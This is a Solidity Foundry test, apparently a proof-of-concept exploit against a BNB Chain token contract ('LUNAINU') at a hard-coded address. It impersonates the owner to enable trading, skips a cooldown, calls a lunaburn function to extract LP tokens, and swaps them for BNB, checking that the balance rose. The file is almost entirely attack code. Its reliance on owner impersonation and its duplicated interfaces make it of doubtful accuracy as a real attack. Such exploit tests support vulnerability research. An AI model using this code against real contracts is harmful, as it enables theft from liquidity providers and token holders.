pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBEP20LUNAINU {
    function getOwner() external view returns (address);
    function clearStuckBalance(uint256 amountPercentage) external;
    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function WBNB() external view returns (address);
}

interface IDEXRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
}

interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function tradingStatus(bool _status) external;
    function lunaburn(uint256 percent_base1000) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function WBNB() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner during exploit
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = BEP20LUNAINU(TARGET).getOwner();

        // Record initial BNB balance
        uint256 initialBalance = address(this).balance;

        // Step 1: Enable trading (impersonate owner)
        vm.prank(owner);
        BEP20LUNAINU(TARGET).tradingStatus(true);

        // Step 2: Warp time forward 3 minutes (180 seconds) to pass lunaburn cooldown
        vm.warp(block.timestamp + 180);

        // Step 3: Call lunaburn to get 5% of LP tokens (max allowed)
        vm.prank(owner);
        BEP20LUNAINU(TARGET).lunaburn(50); // 50/1000 = 5%

        // Check our token balance
        uint256 tokenBalance = BEP20LUNAINU(TARGET).balanceOf(address(this));
        require(tokenBalance > 0, "No tokens received from lunaburn");

        // Step 4: Sell tokens for BNB
        // First need to approve router
        BEP20LUNAINU(TARGET).approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, tokenBalance);

        // Get WBNB address
        address wbnb = BEP20LUNAINU(TARGET).WBNB();

        // Swap tokens for BNB
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = wbnb;

        IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E).swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0, // accept any amount
            path,
            address(this),
            block.timestamp
        );

        // Verify our BNB balance increased
        uint256 finalBalance = address(this).balance;
        require(finalBalance > initialBalance, "BNB balance did not increase");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
